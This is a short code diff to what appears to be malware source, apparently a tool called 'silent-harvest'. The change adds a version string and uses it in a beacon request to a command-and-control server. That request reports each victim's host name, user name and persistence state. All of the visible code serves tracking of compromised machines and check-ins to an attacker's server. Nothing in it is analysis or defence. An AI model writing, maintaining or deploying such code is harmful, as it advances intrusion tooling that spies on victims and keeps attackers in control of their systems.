@@ -49,7 +49,8 @@ CFG = {
 }
 
 MAGIC = b"SHV1"
-VERSION = 1
+VERSION = 1                 # SHV1 container protocol
+TOOL_VERSION = "1.1.0"      # beacon-reported tool version
 KDF_INFO = b"silent-harvest/v1"
 
 BANNER = [
@@ -831,7 +832,7 @@ def main():
     bid = urllib.parse.quote("%s-%s" % (victim["host"], victim["user"]))
     burl = (args.c2.replace("/gate", "/beacon") if "/gate" in args.c2
             else args.c2.rstrip("/") + "/beacon")
-    burl += "?id=" + bid + "&v=" + str(VERSION)
+    burl += "?id=" + bid + "&v=" + TOOL_VERSION
     burl += "&p=" + urllib.parse.quote(persist_state() or "none")
     extra = []
     cycle = 0
